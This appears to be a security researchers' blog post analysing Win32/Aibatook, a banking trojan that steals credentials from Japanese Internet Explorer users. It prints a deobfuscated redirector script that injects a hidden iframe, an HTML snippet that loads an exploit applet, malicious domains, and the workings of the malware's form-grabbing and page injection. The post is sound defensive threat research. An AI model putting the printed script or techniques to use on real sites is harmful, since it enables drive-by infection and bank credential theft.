@@ -1,0 +1,121 @@
+Win32/Aibatook targets Japanese bank customers with an unusual Internet Explorer monitoring technique.
+We believe the malware has been in development for months – and is now ready for take-off.
+This blog post will explore a malware family named Win32/Aibatook, which targets Japanese users’ banking information and hosting providers’ account credentials.
+It appeared at the end of 2013 and a previous version has already been documented by Symantec, which has even sinkholed some of Win32/Aibatook’s C&C servers.
+Far from being discouraged, the operators have since published an updated version and moved from Delphi to C++ as their programming language.
+This post will focus on this new strain, which came out in April 2014 and has some interesting quirks:
+Propagation of the malware is made through a custom exploitation chain placed on compromised websites
+It only targets Internet Explorer, using an unusual technique to steal personal information
+Two different implementations of the information-stealing logic are deployed; the first one is specifically tailored against two major Japanese banks, whereas the second one is more flexible and currently used to target around 90 Japanese websites
+We will first describe the most recent propagation method of Win32/Aibatook, and then its actual functionalities and their implementation
+The Win32/Aibatook bank fraud malware’s story starts, as usual nowadays, with legitimate websites that have been compromised to redirect their visitors to exploit-serving machines in order to infect them with malicious software.
+But rather than using a full-fledged exploit kit – such as Fiesta, Angler or any other of the usual suspects, which are able to serve different exploits depending on the visitor’s configuration – the miscreants behind Win32/Aibatook infections employ only one exploit at a time.
+While it could appear to be a non-optimal strategy, it is actually coherent with the targeted nature of this whole operation.
+If you possess an efficient exploit against your target – Japanese bank customers in this case – why would you bother using more?
+Since mid-April, the exploit used to propagate Win32/Aibatook uses the Java vulnerability CVE-2013-2465.
+In order to do so, several compromised legitimate websites have been used.
+Over the last three months, we identified four of these websites (and we believe there are more) – these domain names are listed below:
+sokuhabo.net www.uravidata.com ppv.xxxurabi.com mywife.cc
+These four websites provide pornographic content aimed at a Japanese audience.
+According to Alexa, three of them belong to the 20,000 most visited websites from Japan; “mywife.cc” is even part of the first 2,000.
+It remains unclear how the attackers compromised these websites.
+The image below describes the exploitation process in the particular case of “ppv.xxxurabi.com” (the others three websites follow similar exploitation logic):
+1.
+The user browses to a webpage on “ppv.xxxurabi.com“, which includes a link to a malicious JavaScript (JS) file hosted on “google.sonovi.com“, another compromised website.
+2.
+Once a first layer of basic obfuscation has been removed, this script has the following form:
+if(document.cookie.indexOf(“GOOGLE1”)==-1) {
+var _d=new Date(); _d.setTime(_d.getTime()+24*60*60*1000); document.cookie=”GOOGLE1=123GOOGLE1456;expires=”+_d.toGMTString(); setTimeout(
+function(){ var _ifr=document.createElement(/ifra/.source+/me/.source); ifr.width=”1″; ifr.height=”1″; ifr.frameborder=”0″; ifr.src=”//2002.jp/”; document.body.appendChild(_ifr)}, 1000)
+}
+The script injects an IFRAME to an exploit-serving webpage “2002.jp”.
+It also sets a Cookie named “GOOGLE1” that will stay on the user’s computer during the next 24 hours, such that no additional redirects occur during this time-frame.
+3.
+Then the user connects to the exploit-serving website, which replies with what looks like an error page:
+Under certain conditions a snippet of HTML code – invisible to the user — will be inserted at the very beginning of the page.
+It is highlighted in blue in the following page source below:
+<HTML> <BODY> <applet id=”HelloApplet” code=”b399.class”,height=”0″ width=”0″></applet> </BODY> </HTML><script src=”//ccc.rejec.net/counter.php”></script> <html> <head> <title>Error 404 Not Found</title> …
+The browser will then download the Java applet “b399.class” from the website and execute it.
+It will also request a file named “counter.php” on another domain.
+We believe this last step is related to the conditions under which the HTML snippet will be inserted: only a limited number of users per day will receive the exploit, explaining the need to count the number of tries.
+This counter script is hosted on what appears to be yet another compromised website, “ccc.rejec.net”.
+4.
+The Java applet is an exploit for the vulnerability CVE-2013-2465.
+Roughly summarized, it starts with an integer overflow in a 2D component of Java SE that leads to a memory corruption in the Abstract Window Toolkit (AWT) code.
+This memory corruption allows the bypass of the Java sandbox through the rewrite of the “SecurityManager” class.
+The exploit will then download the payload from the URL provided by one of the class files, save it as “tar.gif”, and finally execute it.
+The payload URL was “xsvx1014274.xsvr.jp” during our investigation.
+The various class files that we observed as part of this exploit are described below:
+We would like to stress the fact that Win32/Aibatook was distributed through other exploits at different periods of time (e.g.
+CVE-2014-0322), but always in this “one exploit at a time” configuration according to our observations.
+Win32/Aibatook’s main objective is to steal personal and banking information from Japanese users.
+This comes in two different flavors: firstly, a few banks are targeted in a tailored manner, and secondly, around 90 different websites are targeted through a more generic method.
+Both these methods rely on the same Internet Explorer manipulation technique, which we are now going to describe.
+Win32/Aibatook controls Internet Explorer through the COM interface “IHTMLDocument2”, which allows easy reading and writing of webpages with high-level methods.
+To retrieve this interface for the currently browsed webpage, Win32/Aibatook performs the following steps:
+Retrieve a handle on the window under the mouse cursor using “GetCursorPos” and “WindowFromPoint” API functions
+Check whether that window’s class name is “Internet Explorer_Server”: If it is not, the program simply sleeps for one second before retrying If it is, the “IHTMLDocument2” interface is instantiated from the window’s handle, using a documented technique
+If it is not, the program simply sleeps for one second before retrying
+If it is, the “IHTMLDocument2” interface is instantiated from the window’s handle, using a documented technique
+Such Internet Explorer-specific implementations – which work from versions 8 to 11 at least – can seem pretty limited, because no other browsers can be manipulated.
+However, Japan is one of the few countries where Internet Explorer is the most-used browser.
+This is another indicator of Win32/Aibatook’s Japanese-only focus.
+The next two sections present the attacks used by Win32/Aibatook, respectively denoted “Tailored Information Stealer” and “Generic Information Stealer”.
+In the first application of the Internet Explorer monitoring technique, Win32/Aibatook targets a few banks whose URLs are hardcoded into the program.
+During our investigation, we observed Japan Post and the SBI Sumishin Net Bank as targets.
+In order to attack these banks, Win32/Aibatook extracts the URL of the currently visited webpage, using the “IHTMLDocument2.get_url” method, and compares it with the targeted banks’ URLs:
+It should be noted that the banks’ URLs are encrypted with a custom cipher, as are all the malicious strings present in Win32/Aibatook samples.
+More precisely, each encrypted string is composed of two parts:
+The first one is a fixed-length key that looks like a base64 encoded string, but that is actually just random base64 characters.
+Before being used, this key will be XOR-ed with a hardcoded value.
+The second part contains the encrypted data that will be base64 decoded first, and then XOR-ed with the previous key.
+In case it is one of the targeted banks’ URLs, the malicious program will monitor the user login process based on the title of the page (“IHTMLDocument2.get_title”) and its content (“IHTMLDocument2.get_nameProp”).
+During this login process, Win32/Aibatook can do two things:
+Retrieve values entered by the user in certain HTML input fields (login, password, and so forth.)
+Rewrite HTML code displayed to the user by requesting the body of the HTML page (“IHTMLDocument2.get_body”) and modifying it (“body.put_innerHTML”).
+Here is an example of HTML code injected into the Japan Post bank login page:
+The red message roughly translates as an urgent request for the user to type in their personal identification number, because a system upgrade is necessary (clicking on the button just redirects to another page on the Japan Post website).
+Once personal information has been gathered, the program sends it to the C&C server using a hardcoded URL.
+This message is a HTTP POST request containing the grabbed information as parameters, encrypted in a similar manner as the strings previously mentioned.
+It also sends the MAC address of the machine, probably to identify the victim.
+Among the two targeted banks with this method, Japan Post – targeted by Win32/Aibatook since the beginning – receives special treatment:
+A malicious proxy is set in the web browser when the user visits the Japan Post website.
+We were unable to observe the usage of this proxy, but we can guess it is another way to collect the information entered by the user.
+If the user visits an anti-phishing webpage on the Japan Post website, Win32/Aibatook redirects to the login page before the anti-phishing webpage can be loaded.
+Last April, an additional information-stealing technique appeared in Win32/Aibatook.
+It allows attackers to extend the number of targets greatly without too much effort, even targeting non-banking websites.
+During the last few months this technique has been refined and seems recently to have reached a satisfying level – at least from the Win32/Aibatook authors’ point-of-view – as they are now only modifying the content and not the capabilities of the configuration engine.
+This technique, commonly named ‘form-grabbing’, consists of constantly monitoring HTML input fields in webpages browsed by the user.
+In case these input fields match certain conditions, their filled values will then be exfiltrated.
+In order to so, a configuration file describing the target websites is fetched from a hardcoded URL.
+This file is initially encrypted in a similar manner to the strings described before, and will then be stored in memory in plain-text form.
+Here is an excerpt of one particular configuration file we found:
+[VER]1000[/VER] [W]
+[Web]xy40[/Web] [CURL]REDACTED.jp[/CURL] [CTI][/CTI] [NAME]memberid[/NAME] [NAME]password[/NAME] [NAME]domain[/NAME]
+[/W] [W] … [/W]
+It’s a structured file with hierarchical tags similar to HTML language, except that tags are enclosed in brackets.
+It starts with a version tag, followed by a series of “[W]” entries, each of them representing a target and containing multiple sub-entries:
+“[Web]” tag contains the target’s name, which is usually set to some kind of code name with no apparent meaning
+“[CURL]” tag contains the target webpage’s URL (target’s URL has been removed from the previous image)
+“[CTI]” tag contains the target webpage’s title
+”[NAME]” tag defines an HTML input field’s name that will be leaked
+“[ID]” tag defines an HTML input field’s ID that will be leaked
+The logic followed by the program with this configuration file is the following: if a website’s URL matches the “[CURL]” tag value of one entry, or its title matches the “[CTI]” value tag, then each HTML input field that matches either “[NAME]” or “[ID]” tag values will be exfiltrated.
+To make it clear, let’s take a look at an artificial example:
+[W]
+[Web] CONFIG_DEMO [/Web] [CURL][/CURL] [CTI][/CTI] [NAME] user_name [/NAME] [ID] user_password [/ID]
+[/W]
+In this example we have, from left to right, a Win32/Aibatook’s configuration file with one entry, then a visited webpage that will trigger this entry, and finally the information sent to the exfiltration server.
+This information-stealing technique is highly flexible; in particular some entries come with empty values for “[CURL]” and “[CTI]” tags, making any webpage with the corresponding HTML input fields a match.
+In terms of targets, we found 87 of them during our investigation.
+We were able to identify some of them, based on the “[CURL]” and “[CTI]” tags values, whereas the others remain unidentified.
+The domains of activity of these targets are described below:
+As expected, the majority of the identified targets belong to the banking domain, but some of them are hosting companies, which could explain how legitimate websites are compromised and then used in the exploitation chain.
+It should be noted that the majority of the identified targets are important businesses in Japan.
+In this blog post we have described Win32/Aibatook, a malware family targeting Japanese users.
+Computers become infected by this malware through a custom exploitation chain served by compromised legitimate websites.
+Its main purpose is to steal personal information through an unusual Internet Explorer monitoring technique.
+This technique implements two different information stealers, one specifically tailored against a few major Japanese banks, and a second one targeting around 90 different websites.
+Based on our observations during this investigation, Win32/Aibatook has been constantly developed over the past few months.
+We believe that this malware family is now ready for take-off, and we expect its authors to spread it more broadly in the near future.
+This analysis was created by Clément Rouault, in collaboration with Joan Calvet.
